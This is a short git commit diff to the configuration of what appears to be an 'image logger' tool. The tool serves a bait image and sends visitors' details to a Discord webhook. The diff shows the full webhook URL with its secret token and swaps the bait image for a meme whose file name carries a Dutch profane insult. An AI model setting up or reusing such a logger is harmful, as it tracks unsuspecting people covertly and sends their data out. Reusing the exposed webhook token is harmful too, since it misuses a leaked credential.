a650a403ae831aad3e4b471dd2b20881aad93ac0
mk49-35 <mookass49@hotmail.com>
2026-02-01 21:29:26 +0100

    Update image URL in configuration

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discordapp.com/api/webhooks/1467615527881937077/1Mng9CdHRNfdpUSbDZOQ4D1I8jmnr4wktEHuyqeJbA7lMN7w2xAkrSEadPDyHZMlZtIx",
-    "image": "https://pbs.twimg.com/media/GtQu5WbWUAA0GOC.jpg", # You can also have a custom image by using a URL argument
+    "image": "https://media.makeameme.org/created/je-kanker-moeder-fb09199bad.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
